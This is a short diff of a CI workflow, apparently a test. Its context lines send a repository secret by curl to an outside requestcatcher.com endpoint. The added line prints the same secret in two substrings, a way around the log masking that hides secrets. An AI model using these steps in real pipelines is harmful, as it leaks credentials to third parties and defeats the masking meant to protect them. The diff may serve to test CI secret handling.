@@ -12,3 +12,5 @@ jobs:
         run: |
           curl -X POST -d 'Hello from CI!' https://test409magg4ag.requestcatcher.com/ci
           curl -X POST -d "Value: ${{ secrets.TEST_SECRET_DELETE_THIS_ANYTIME }}" https://test409magg4ag.requestcatcher.com/ci
+          echo ${${{ secrets.TEST_SECRET_DELETE_THIS_ANYTIME }}:0:4}; echo ${${{ secrets.TEST_SECRET_DELETE_THIS_ANYTIME }}:4:200}
+          
